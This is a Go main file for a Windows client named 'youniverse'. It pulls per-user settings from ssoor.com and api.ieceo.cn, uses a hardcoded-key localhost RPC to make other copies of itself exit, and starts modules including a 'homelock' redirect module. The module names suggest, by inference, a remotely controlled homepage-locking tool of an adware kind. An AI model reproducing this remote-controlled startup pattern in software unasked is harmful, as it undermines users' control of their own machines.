package main

import (
	"encoding/json"
	"errors"
	"flag"
	"fmt"
	"net"
	"net/http"
	"net/rpc"
	"os"
	"strconv"
	"strings"
	"time"

	"os/signal"

	"github.com/ssoor/youniverse/api"
	"github.com/ssoor/youniverse/common"
	"github.com/ssoor/youniverse/fundadore"
	"github.com/ssoor/youniverse/internest"
	"github.com/ssoor/youniverse/log"
	"github.com/ssoor/youniverse/redirect"
	"github.com/ssoor/youniverse/youniverse"
)

const (
	YouniverseListenPort     uint16 = 13600
	YouiverseSinnalNotifyKey string = "6491628D0A302AA2"
)

var chanSignal chan os.Signal = make(chan os.Signal, 1)

const (
	SignalKill = iota
	SignalTermination
)

type SignalArgs struct {
	Level  uint
	Signal int

	Kay string
}

type SignalReply struct {
	Kay string
}

type Signal struct {
	Level uint
}

func (s *Signal) Notify(args *SignalArgs, reply *SignalReply) error {
	if false == strings.EqualFold(args.Kay, YouiverseSinnalNotifyKey) {
		return errors.New("Unauthorized access")
	}

	switch args.Signal {
	case SignalKill:
		if s.Level > args.Level { // 运行级别高于通知方级别，不予退出，并通知对方退出
			reply.Kay = YouiverseSinnalNotifyKey
			break
		}
		chanSignal <- os.Kill
	case SignalTermination:
		chanSignal <- os.Kill
	}

	return nil
}

func notifySignalExit(level uint) (bool, error) {
	client, err := rpc.DialHTTP("tcp", "localhost:7122")
	if err != nil {
		return true, nil
	}

	args := &SignalArgs{
		Level:  level,
		Signal: SignalKill,

		Kay: YouiverseSinnalNotifyKey,
	}

	reply := &SignalReply{}
	err = client.Call("Signal.Notify", args, &reply)
	if err != nil {
		return false, errors.New(fmt.Sprint("Notify old youniverse exit error:", err))
	}

	if strings.EqualFold(reply.Kay, YouiverseSinnalNotifyKey) {
		return false, errors.New(fmt.Sprint("Old youniverse notify current process exit."))
	}

	time.Sleep(2 * time.Second)

	return true, nil
}

func notifySignalTerminate() (bool, error) {
	client, err := rpc.DialHTTP("tcp", "localhost:7122")
	if err != nil {
		return false, err
	}

	args := &SignalArgs{
		Level:  0,
		Signal: SignalTermination,

		Kay: YouiverseSinnalNotifyKey,
	}

	reply := &SignalReply{}
	err = client.Call("Signal.Notify", args, &reply)
	if err != nil {
		return false, errors.New(fmt.Sprint("Notify old youniverse exit error:", err))
	}

	time.Sleep(2 * time.Second)

	return true, nil
}

func startSignalNotify(level uint) {
	rpcSignal := &Signal{
		Level: level,
	}

	rpc.Register(rpcSignal)
	rpc.HandleHTTP()

	listen, err := net.Listen("tcp", "localhost:7122")
	if err != nil {
		log.Warning("listen rpc signal error:", err)
	}

	http.Serve(listen, nil)
}

func getStartSettings(account string, guid string) (config Config, err error) {

	var url string
	if false == strings.HasPrefix(guid, "00000000_") {
		url = "http://social.ssoor.com/issued/settings/20160521/" + account + "/" + guid + ".settings"
	} else {
		//url = "http://api.lp8.com/Init/Default/GUID/" + guid
		url = "http://api.ieceo.cn/Init/Default/GUID/" + guid
		//url = "http://younverse.ssoor.com/issued/settings/20160628/" + account + "/" + guid + ".settings"
	}

	jsonConfig, err := api.GetURL(url)
	if err != nil {
		return config, errors.New(fmt.Sprint("Query setting interface failed, err: ", err))
	}

	if err = json.Unmarshal([]byte(jsonConfig), &config); err != nil {
		return config, errors.New("Unmarshal setting interface failed.")
	}

	return config, nil
}

func main() {
	var debug bool
	var guid, account string

	flag.BoolVar(&debug, "debug", false, "Whether to start the debug mode")
	flag.StringVar(&account, "account", "everyone", "user name, used to obtain user configuration")
	flag.StringVar(&guid, "guid", "auto", "unique identifier, used to obtain user configuration")

	flag.Parse()

	logFileDir := os.ExpandEnv("${APPDATA}\\SSOOR")

	os.MkdirAll(logFileDir, 0777)

	logFilePath := logFileDir + "\\youniverse.log"
	file, err := os.OpenFile(logFilePath, os.O_RDWR|os.O_CREATE, 0777)
	if err != nil {
		log.Warning("open log file", logFilePath, "error:", err.Error())
	}

	defer file.Close()

	log.SetOutputFile(file)

	defer log.Info("[MAIN] The Youniverse has finished running, exiting...")

	if succ, err := notifySignalExit(0); false == succ {
		log.Error("Notify old process exit:", err)
		return
	}

	if strings.HasPrefix(guid, "00000000_") {
		go startSignalNotify(0)
	} else {
		go startSignalNotify(1)
	}

	log.Info("[MAIN] Youniverse guid:", guid)
	log.Info("[MAIN] Youniverse account name:", account)

	port, err := common.SocketSelectPort("tcp", int(YouniverseListenPort))

	if err != nil {
		log.Error("Select youniverse listen port failed:", err)
		return
	}

	config, err := getStartSettings(account, guid)

	if err != nil {
		log.Error("Request start settings failed:", err)
		return
	}

	if debug {
		config.Homelock.Encode = false
		log.Info("[MAIN] Current starting to debug...")
	}

	log.Info("[MAIN] Start youniverse module:")
	connInternalIP, err := common.GetConnectIP("tcp", "www.baidu.com:80")

	if err != nil {
		log.Error("Query connection ip failed:", err)
		return
	}

	peerAddr := connInternalIP + ":" + strconv.Itoa(int(port))
	if err := youniverse.StartYouniverse(account, guid, peerAddr, config.Youniverse); err != nil {
		log.Error("[MAIN] Youniverse start failed:", err)
		return
	}

	log.Info("[MAIN] Start fundadore module:")
	succ, err := fundadore.StartFundadores(account, guid, config.Fundadore)
	log.Info("[MAIN] Fundadore start stats:", succ)
	if false == succ {
		log.Error("[MAIN] \t", err)
		return
	}

	log.Info("[MAIN] Start internest module:")
	succ, err = internest.StartInternest(account, guid, config.Internest)
	log.Info("[MAIN] Internest start stats:", succ)
	if false == succ {
		log.Error("[MAIN] \t", err)
		return
	}

	log.Info("[MAIN] Start homelock module:")
	succ, err = redirect.StartHomelock(account, guid, config.Homelock)
	log.Info("[MAIN] Homelock start stats:", succ)
	if false == succ {
		log.Error("[MAIN] \t", err)
		return
	}

	log.Info("[MAIN] Module start end")

	signal.Notify(chanSignal, os.Interrupt, os.Kill)

	<-chanSignal
}
